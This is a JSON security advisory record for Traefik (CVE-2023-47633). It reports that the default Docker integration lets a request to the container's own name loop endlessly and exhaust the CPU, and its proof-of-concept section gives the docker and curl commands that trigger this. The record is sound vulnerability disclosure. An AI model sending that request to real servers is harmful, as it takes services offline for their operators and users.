{
  "Severity": "HIGH",
  "UpdatedAt": "2023-12-05T18:13:55Z",
  "Package": {
    "Ecosystem": "GO",
    "Name": "github.com/traefik/traefik/v3"
  },
  "Advisory": {
    "DatabaseId": 227632,
    "Id": "GSA_kwCzR0hTQS02ZndnLWpyZnctZmY3cM4AA3kw",
    "GhsaId": "GHSA-6fwg-jrfw-ff7p",
    "References": [
      {
        "Url": "https://github.com/traefik/traefik/security/advisories/GHSA-6fwg-jrfw-ff7p"
      },
      {
        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2023-47633"
      },
      {
        "Url": "https://github.com/traefik/traefik/releases/tag/v2.10.6"
      },
      {
        "Url": "https://github.com/traefik/traefik/releases/tag/v3.0.0-beta5"
      },
      {
        "Url": "https://github.com/advisories/GHSA-6fwg-jrfw-ff7p"
      }
    ],
    "Identifiers": [
      {
        "Type": "GHSA",
        "Value": "GHSA-6fwg-jrfw-ff7p"
      },
      {
        "Type": "CVE",
        "Value": "CVE-2023-47633"
      }
    ],
    "Description": "### Summary\n\nThe traefik docker container uses 100% CPU when it serves as its own backend, which is an automatically generated route resulting from the Docker integration in the default configuration.\n\n### Details\n\nWhile attempting to set up Traefik to handle traffic for Docker containers, I observed in the webUI a rule with the following information:\n\n`Host(traefik-service) | webwebsecure | traefik-service@docker | traefik-service`\n\nI assumed that this is something internal; however, I wondered why it would have a host rule on the web entrypoint configured.\n\nSo I have send a request with that hostname with `curl -v --resolve \"traefik-service:80:xxx.xxx.xxx.xxx\" http://traefik-service`. That made my whole server unresponsive.\n\nI assume the name comes from a docker container with that name, traefik itself:\n```\nlocalhost ~ # docker ps\nCONTAINER ID   IMAGE                                                   COMMAND                  CREATED             STATUS         PORTS                                                                                                NAMES\nd1414e74aec7   traefik:v2.10                                           \"/entrypoint.sh traeâ€¦\"   4 minutes ago       Up 4 minutes   0.0.0.0:80-\u003e80/tcp, :::80-\u003e80/tcp, 0.0.0.0:443-\u003e443/tcp, :::443-\u003e443/tcp, 127.0.0.1:8080-\u003e8080/tcp   traefik.service\n```\n\n### PoC\n\n1. Start traefik with `docker run --rm -v /var/run/docker.sock:/var/run/docker.sock -p 80:80 --name foo -p 8080:8080 traefik:v2.10 --api.insecure=true --providers.docker`\n\n2. `curl -v --resolve \"foo:80:127.0.0.1\" http://foo`\n\nlooks like this creates an endless loop of request.\n\nKnowing the name of the docker container seems to be enough to trigger this, if the docker backend is used.\n\n### Impact\n\nServer is unreachable and uses 100% CPU",
    "Origin": "UNSPECIFIED",
    "PublishedAt": "2023-12-05T18:13:53Z",
    "Severity": "HIGH",
    "Summary": "Traefik docker container using 100% CPU",
    "UpdatedAt": "2023-12-05T18:13:55Z",
    "WithdrawnAt": "",
    "CVSS": {
      "Score": 7.5,
      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
    }
  },
  "Versions": [
    {
      "FirstPatchedVersion": {
        "Identifier": "3.0.0-beta5"
      },
      "VulnerableVersionRange": "\u003c 3.0.0-beta5"
    }
  ]
}